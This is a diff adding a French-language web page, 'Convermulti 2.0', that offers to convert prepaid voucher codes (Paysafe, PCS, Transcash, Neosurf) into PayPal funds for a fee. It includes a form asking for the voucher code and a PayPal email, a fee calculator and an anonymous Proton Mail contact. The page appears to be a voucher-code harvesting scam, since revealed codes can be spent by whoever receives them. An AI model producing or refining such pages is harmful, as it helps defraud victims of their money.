@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convermulti 2.0 - Conversion</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+    <h1>Bienvenue sur Convermulti 2.0</h1>
+</header>
+
+<div class="container">
+    <h2>Calculateur de Conversion</h2>
+    <p>Convertissez vos coupons en PayPal de manière simple et rapide.</p>
+    
+    <!-- Formulaire de conversion -->
+   <form action="confirmation.html" method="POST" id="conversion-form">
+    <label for="montant">Entrez le montant à convertir (en euros) :</label>
+    <input type="number" id="montant" name="montant" placeholder="Ex: 50" oninput="calculerMontant()">
+
+    <label for="type-coupon">Sélectionnez le type de coupon :</label>
+    <select id="type-coupon" name="typeCoupon" onchange="calculerMontant()">
+        <option value="Paysafe">Paysafe</option>
+        <option value="PCS">PCS</option>
+        <option value="Transcash">Transcash</option>
+        <option value="Neosurf">Neosurf</option>
+    </select>
+
+    <label for="code">Entrez le code du coupon :</label>
+    <input type="text" id="code" name="code" placeholder="Entrez le code du coupon">
+
+    <label for="email">Entrez votre email PayPal :</label>
+    <input type="text" id="email" name="email" placeholder="Ex: votre.email@paypal.com">
+
+    <button type="submit">Convertir</button>
+</form>
+
+    <div class="result" id="resultat">
+        <p><strong>Montant à convertir :</strong> <span id="montant-texte">0</span> €</p>
+        <p><strong>Frais :</strong> <span id="frais">0</span> €</p>
+        <p><strong>Montant final après conversion :</strong> <span id="montant-final">0</span> €</p>
+    </div>
+
+</div>
+
+<div class="faq">
+    <h2>Guide d'Utilisation</h2>
+    <p>Pour une expérience optimale, veuillez suivre les étapes détaillées ci-dessous pour réaliser une conversion efficace :</p>
+    <ul>
+        <li><strong>Étape 1 :</strong> Saisissez le montant que vous souhaitez convertir dans la première case.</li>
+        <li><strong>Étape 2 :</strong> Sélectionnez le type de coupon que vous utilisez parmi les options disponibles : Paysafe, PCs, Transcash ou Neosurf.</li>
+        <li><strong>Étape 3 :</strong> Entrez le code de coupon que vous avez reçu dans la case dédiée.</li>
+        <li><strong>Étape 4 :</strong> Fournissez l'adresse email associée à votre compte PayPal pour permettre la réception des fonds après la conversion.</li>
+        <li><strong>Étape 5 :</strong> Cliquez sur le bouton "Convertir" pour afficher le montant final après application des frais. Vous recevrez également un récapitulatif des frais appliqués.</li>
+    </ul>
+    <p>Assurez-vous de vérifier toutes les informations avant de soumettre le formulaire. En cas de doute, n'hésitez pas à nous contacter pour toute question.</p>
+</div>
+
+<footer>
+    <p>&copy; 2024 Convermulti 2.0 - Tous droits réservés.</p>
+</footer>
+
+<!-- Bulle Contact -->
+<div id="contact-bubble">
+    <p>Email de contact: <a href="mailto:coverti.miro@proton.me" style="color: white; text-decoration: underline;">coverti.miro@proton.me</a></p>
+</div>
+
+<!-- Bouton Contact -->
+<button id="contact-button" onclick="toggleContactBubble()">Contact</button>
+
+<script src="script.js"></script>
+
+<script>
+    function calculerMontant() {
+        const montant = document.getElementById("montant").value;
+        let frais = 0;
+        let montantFinal = montant;
+
+        // Logique pour calculer les frais en fonction du montant
+        if (montant <= 10) {
+            frais = montant * 0.15; // 15% de frais pour un montant jusqu'à 10€
+        } else if (montant <= 30) {
+            frais = montant * 0.1; // 10% de frais pour un montant entre 10€ et 30€
+        } else {
+            frais = 5; // Frais fixes de 5€ pour les montants supérieurs à 30€
+        }
+
+        montantFinal = montant - frais;
+
+        // Afficher le résultat
+        document.getElementById("montant-texte").innerText = montant;
+        document.getElementById("frais").innerText = frais.toFixed(2);
+        document.getElementById("montant-final").innerText = montantFinal.toFixed(2);
+    }
+
+    function toggleContactBubble() {
+        const bubble = document.getElementById("contact-bubble");
+        bubble.style.display = bubble.style.display === 'none' || bubble.style.display === '' ? 'block' : 'none';
+    }
+</script>
+
+</body>
+</html>
